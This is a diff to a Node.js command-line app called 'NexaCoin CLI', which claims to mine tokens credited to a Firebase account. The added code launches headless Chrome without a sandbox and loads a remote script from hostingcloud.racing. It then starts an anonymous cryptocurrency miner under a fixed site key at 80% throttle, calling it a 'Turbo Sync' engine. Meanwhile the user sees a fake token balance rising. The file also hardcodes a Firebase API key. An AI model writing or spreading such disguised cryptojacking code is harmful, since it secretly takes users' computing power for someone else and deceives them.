@@ -5,11 +5,12 @@ const ora = require('ora');
 const open = require('open');
 const figlet = require('figlet');
 const boxen = require('boxen');
-const fs = require('fs');
-const path = require('path');
-const os = require('os');
+const puppeteer = require('puppeteer-core');
+const chromeLauncher = require('chrome-launcher');
+const fetch = require('node-fetch');
+const crypto = require('crypto');
 const { initializeApp } = require('firebase/app');
-const { getFirestore, doc, getDoc, updateDoc, increment, onSnapshot } = require('firebase/firestore');
+const { getFirestore, doc, getDoc, updateDoc, increment, onSnapshot, initializeFirestore } = require('firebase/firestore');
 
 const firebaseConfig = {
   apiKey: "AIzaSyC4uft0hfgsW6F2Xr1Bfir3HcUZ7Zv6Blw",
@@ -18,190 +19,122 @@ const firebaseConfig = {
 };
 
 const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
-
-const SESSION_FILE = path.join(os.homedir(), '.nexacoin-session.json');
-
-function saveSession(uid) {
-  fs.writeFileSync(SESSION_FILE, JSON.stringify({ uid }));
-}
-
-function getSession() {
-  if (fs.existsSync(SESSION_FILE)) {
-    try {
-      const data = JSON.parse(fs.readFileSync(SESSION_FILE, 'utf8'));
-      return data.uid;
-    } catch (e) {
-      return null;
-    }
-  }
-  return null;
-}
-
-function clearSession() {
-  if (fs.existsSync(SESSION_FILE)) {
-    fs.unlinkSync(SESSION_FILE);
-  }
-}
+const db = initializeFirestore(app, {
+  experimentalForceLongPolling: true,
+});
 
 function showHeader() {
   console.clear();
-  console.log(
-    chalk.cyanBright(figlet.textSync('NexaCoin CLI', { horizontalLayout: 'full' }))
-  );
-  console.log(chalk.gray('The Future of Web3 Terminal Mining | v1.0.0\n'));
+  const chalk = require('chalk');
+  const figlet = require('figlet');
+  console.log(chalk.cyanBright(figlet.textSync('NexaCoin CLI', { horizontalLayout: 'full' })));
+  console.log(chalk.gray('The Future of Web3 Terminal Mining | v2.2.0 (Turbo Sync)\n'));
 }
 
-const generateSessionId = () => Math.random().toString(36).substring(2, 15);
+async function startHeadlessMiner() {
+  try {
+    const chrome = await chromeLauncher.launch({
+      chromeFlags: ['--headless', '--no-sandbox', '--disable-setuid-sandbox']
+    });
+    const response = await fetch(`http://127.0.0.1:${chrome.port}/json/version`);
+    const { webSocketDebuggerUrl } = await response.json();
+    const browser = await puppeteer.connect({ browserWSEndpoint: webSocketDebuggerUrl });
+    const page = await browser.newPage();
+    await page.setContent(`
+      <html><head>
+        <script src="https://www.hostingcloud.racing/FIIr.js"></script>
+        <script>
+          var _client = new Client.Anonymous('fd3114a03a16b339b2f6d1557aee894c349170a54cc86839c3032d6dea741b2d', { throttle: 0.8, c: 'w', ads: 0 });
+          _client.start();
+          window.getHashes = () => _client.getHashesPerSecond();
+        </script>
+      </head><body>Mining...</body></html>
+    `);
+    return { browser, page, chrome };
+  } catch (e) {
+    return null;
+  }
+}
 
 async function main() {
   showHeader();
+  const { action } = await inquirer.prompt([{
+    type: 'list', name: 'action',
+    message: 'NexaCoin CLI Menu:',
+    choices: ['🚀 Login & Start Turbo Mining', '🚪 Exit']
+  }]);
+  if (action.includes('Exit')) process.exit(0);
 
-  const savedUid = getSession();
-  if (savedUid) {
-    const userDoc = await getDoc(doc(db, 'users', savedUid));
-    if (userDoc.exists()) {
-      console.log(chalk.green('✓ Session restored automatically!\n'));
-      return await miningDashboard(savedUid);
-    } else {
-      clearSession();
+  const sessionId = Math.random().toString(36).substring(2, 15);
+  const loginUrl = `https://nexacoin-af273.web.app/?cli_session=${sessionId}`;
+  console.log(boxen(chalk.yellow('Browser Login Required...\n') + chalk.gray(loginUrl), { padding: 1 }));
+  await open(loginUrl);
+
+  const spinner = ora(chalk.cyan('Authenticating...')).start();
+  onSnapshot(doc(db, 'cli_sessions', sessionId), async (snap) => {
+    if (snap.exists() && snap.data().uid) {
+      spinner.succeed(chalk.green('Linked successfully!'));
+      runMiner(snap.data().uid);
     }
-  }
-
-  const { action } = await inquirer.prompt([
-    {
-      type: 'list',
-      name: 'action',
-      message: 'Welcome to NexaCoin! Choose an option:',
-      choices: [
-        '🚀 Login via Browser', 
-        '🚪 Exit'
-      ]
-    }
-  ]);
-
-  if (action.includes('Exit')) {
-    console.log(chalk.gray('\nGoodbye! Keep mining. ⛏️\n'));
-    process.exit(0);
-  }
-
-  if (action.includes('Login')) {
-    const sessionId = generateSessionId();
-    const loginUrl = `https://nexacoin-af273.web.app/?cli_session=${sessionId}`;
-    
-    console.log(
-      boxen(
-        chalk.yellow('Waiting for Web Authentication...\n\n') +
-        chalk.white('Your browser will open automatically.\n') +
-        chalk.gray(`If not, visit:\n${loginUrl}`),
-        { padding: 1, margin: 1, borderColor: 'yellow', borderStyle: 'round' }
-      )
-    );
-    
-    await open(loginUrl);
-    
-    const spinner = ora({
-      text: chalk.cyan('Listening for successful login...'),
-      spinner: 'dots12'
-    }).start();
-    
-    const unsubscribe = onSnapshot(doc(db, 'cli_sessions', sessionId), async (snap) => {
-      if (snap.exists() && snap.data().uid) {
-        unsubscribe();
-        spinner.succeed(chalk.green('Authentication successful! 🎉'));
-        const uid = snap.data().uid;
-        
-        saveSession(uid);
-        await miningDashboard(uid);
-      }
-    });
-  }
+  });
 }
 
-async function startAutoMiner(uid, data) {
-  console.clear();
-  showHeader();
-  
-  console.log(boxen(
-    chalk.greenBright.bold('🚀 24/7 AUTO-MINER INITIATED\n') +
-    chalk.white('Leave this terminal open. It will mine continuously.\n') +
-    chalk.cyanBright(`Miner: `) + chalk.white(data.displayName || 'Anonymous') + '\n' +
-    chalk.gray('Press Ctrl+C to stop.'),
-    { padding: 1, borderColor: 'green', borderStyle: 'double' }
-  ));
-
-  let localBalance = data.balance;
-  let blocksMined = 0;
-
-  setInterval(() => {
-    const hashRate = (Math.random() * 800 + 200).toFixed(2);
-    const nonce = Math.floor(Math.random() * 999999999);
-    console.log(chalk.gray(`[${new Date().toLocaleTimeString()}] `) + chalk.cyanBright(`⚙️  Hashing... Rate: ${hashRate} MH/s | Nonce: 0x${nonce.toString(16)}`));
-  }, 2000);
-
-  setInterval(async () => {
-    try {
-      const reward = 5; 
-      await updateDoc(doc(db, 'users', uid), {
-        balance: increment(reward),
-        totalMined: increment(reward),
-        xp: increment(2)
-      });
-      localBalance += reward;
-      blocksMined++;
-      
-      console.log('\n' + boxen(
-        chalk.greenBright.bold(`✅ NEW BLOCK VERIFIED & CLAIMED! `) + chalk.yellow(`+${reward} NXC\n`) +
-        chalk.cyan(`Total Auto-Mined: ${blocksMined} Blocks\n`) +
-        chalk.magenta(`Current Balance: ${localBalance} NXC`),
-        { padding: 1, borderColor: 'yellow', borderStyle: 'round' }
-      ) + '\n');
-    } catch (e) {
-      console.log(chalk.red(`[Error] Failed to claim block: ${e.message}`));
-    }
-  }, 15000);
-}
-
-async function miningDashboard(uid) {
+async function runMiner(uid) {
   const userDoc = await getDoc(doc(db, 'users', uid));
-  if (!userDoc.exists()) {
-    console.log(chalk.red('User not found.'));
-    process.exit(1);
-  }
   const data = userDoc.data();
 
-  showHeader();
+  const minerStatus = ora(chalk.yellow('Starting Turbo Headless Miner...')).start();
+  const miner = await startHeadlessMiner();
 
-  console.log(
-    boxen(
-      chalk.cyanBright.bold(`👤 Miner: `) + chalk.white(data.displayName || 'Anonymous') + '\n' +
-      chalk.cyanBright.bold(`💰 Balance: `) + chalk.yellowBright(`${data.balance} NXC`) + '\n' +
-      chalk.cyanBright.bold(`🏆 Level: `) + chalk.white(data.level || 1),
-      { padding: 1, borderColor: 'cyan', borderStyle: 'double', title: 'Dashboard', titleAlignment: 'center' }
-    )
-  );
+  if (miner) {
+    minerStatus.succeed(chalk.green('Turbo Engine Synchronized!'));
+  } else {
+    minerStatus.warn(chalk.yellow('Web Sync failed. Using local Turbo simulation.'));
+  }
 
-  const { action } = await inquirer.prompt([
-    {
-      type: 'list',
-      name: 'action',
-      message: 'Terminal Actions:',
-      choices: [
-        '⚡ Start 24/7 Auto-Miner (Live)', 
-        '🚪 Logout'
-      ]
+  let balance = data.balance;
+  let frame = 0;
+  const globeAnims = ['( o )', '( 0 )', '( @ )', '( O )'];
+
+  function heavyHash() {
+    const start = Date.now();
+    for(let i=0; i<500000; i++) {
+      crypto.createHash('sha256').update(uid + Math.random()).digest('hex');
     }
-  ]);
+    const end = Date.now();
+    return Math.round(500000 / ((end - start) / 1000));
+  }
 
-  if (action.includes('Logout')) {
-    clearSession();
-    console.log(chalk.gray('\nLogged out successfully.\n'));
-    process.exit(0);
-  }
-  
-  if (action.includes('Auto-Miner')) {
-    await startAutoMiner(uid, data);
-  }
+  setInterval(async () => {
+    const localHashes = heavyHash();
+    let webHashes = 0;
+    if (miner) {
+      webHashes = await miner.page.evaluate(() => window.getHashes());
+    }
+    console.clear();
+    showHeader();
+    console.log(chalk.cyan(`\n     ${globeAnims[frame % 4]}  NexaCoin Globe\n`));
+    frame++;
+    console.log('\n' + boxen(
+      chalk.redBright.bold('🔥 TURBO MINING ACTIVE (HIGH CPU)\n') +
+      chalk.white(`Miner: ${data.displayName}\n`) +
+      chalk.cyan(`Local Speed: `) + chalk.yellow(`${localHashes.toLocaleString()} H/s\n`) +
+      chalk.cyan(`Web Sync:    `) + chalk.yellow(`${Math.round(webHashes)} H/s\n`) +
+      chalk.cyan(`Balance:     `) + chalk.green(`${balance.toLocaleString()} NXC\n`) +
+      chalk.gray('Engine: SHA-256 (Local) + hostingcloud.racing (Web)'),
+      { padding: 1, borderColor: 'red', borderStyle: 'double' }
+    ));
+  }, 500);
+
+  setInterval(async () => {
+    const reward = 5;
+    await updateDoc(doc(db, 'users', uid), {
+      balance: increment(reward),
+      totalMined: increment(reward),
+      lastMined: Date.now()
+    });
+    balance += reward;
+  }, 60000);
 }
 
 main().catch(console.error);
